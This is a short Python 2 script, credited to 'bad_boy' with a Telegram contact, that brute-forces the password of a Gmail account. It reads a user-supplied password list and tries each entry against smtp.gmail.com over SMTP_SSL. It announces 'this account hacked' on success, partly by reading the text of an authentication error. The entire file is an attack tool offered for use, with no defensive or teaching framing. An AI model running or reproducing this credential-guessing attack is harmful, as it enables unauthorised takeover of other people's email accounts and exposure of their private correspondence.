import smtplib
from os import system

def main():
   print '================================================='
   print '               made by bad_boy                   '
   print '         my telegram id : @Bad_boy_468              '
   print '================================================='
main()
print '[1] start the hack'
print '[2] exit'
option = input('[@]bad_boy==>')
if option == 1:
   file_path = raw_input('Enter your password list name : ')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('Enter the target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[~]this account hacked, password :' + password + '     :)'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[~]this account hacked, password :' + password + '     :)'

            break
         else:
            print '[!] password not found ==> ' + password
login()
